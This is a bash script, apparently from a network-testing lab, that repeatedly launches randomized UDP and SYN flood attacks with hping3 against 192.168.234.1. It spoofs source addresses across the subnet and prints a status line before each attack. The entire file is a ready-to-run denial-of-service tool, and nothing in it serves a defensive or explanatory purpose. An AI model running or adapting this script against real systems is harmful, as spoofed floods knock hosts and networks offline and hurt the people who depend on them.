#!/bin/bash

COUNTER=0
while true
do
	rand_run=$(( $RANDOM % 26 + 5));
	rand_stop=$(( $RANDOM % 16 + 5))
        rand_ip=$(( $RANDOM % 180 + 5))
	if [ $((rand_run % 2)) -eq 0 ]; then
	    echo "UDP Flood Attack will be running for $rand_run seconds. Next attack will be in $rand_stop seconds.";
	    timeout $rand_run sudo hping3 -i u1 -2 -k -a 192.168.234.$rand_ip 192.168.234.1 -d 242 -I wave-data
		
	    COUNTER=$(( COUNTER + 1 ))	
	    sleep $rand_stop		
	else
	    echo "Syn Flood Attack will be running for $rand_run seconds. Next attack will be in $rand_stop seconds.";
	    timeout $rand_run sudo hping3 -i u1 -S -k -a 192.168.234.$rand_ip 192.168.234.1 -d 290 -I wave-data		
	    COUNTER=$(( COUNTER + 1 ))		
	    sleep $rand_stop
	fi
        
	
	if [ $((COUNTER)) -eq 199 ]; then
        exit 1
    fi
done
